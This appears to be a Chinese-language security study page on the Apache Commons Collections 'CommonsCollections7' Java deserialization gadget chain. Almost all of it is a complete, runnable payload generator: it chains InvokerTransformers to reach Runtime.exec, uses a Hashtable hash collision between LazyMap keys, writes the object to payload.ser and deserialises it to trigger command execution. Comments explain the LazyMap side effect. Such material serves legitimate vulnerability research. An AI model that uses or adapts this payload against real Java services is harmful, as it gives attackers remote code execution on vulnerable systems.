---
description: 把lazyMap作为key传入到hashset或者hashtable的时候往往都会对lazyMap本身的map参数造成一定影响
---

# CommonsCollections7

PayLoad:

```java
import com.nqzero.permit.Permit;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.Map;

import static sun.reflect.misc.FieldUtil.getField;

public class CommonsCollections7 {
    // 设置成员变量值
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = null;
        try {
            //获取私有成员变量
            field = obj.getClass().getDeclaredField(fieldName);
            //获取私有成员变量访问权限
            Permit.setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (obj.getClass().getSuperclass() != null)
                field = getField(obj.getClass().getSuperclass(), fieldName);
        }
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        String command = "calc";
        final String[] execArgs = new String[]{command};
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        execArgs),
                new ConstantTransformer(1)};
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        //开启调试模式去跟一下hashtable.put(lazyMap2, 2)这个代码执行后的变量变化，会发现会发现lazyMap2的map内多了一个 yy->yy的map
        hashtable.put(lazyMap2, 2);
        setFieldValue(transformerChain, "iTransformers", transformers);
        //这一步正是为了删除在hashtable.put(lazyMap2, 2)后lazyMap2中多出的那个yy->yy的map
        lazyMap2.remove("yy");
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object newObj = ois.readObject();
        ois.close();
    }
}

```



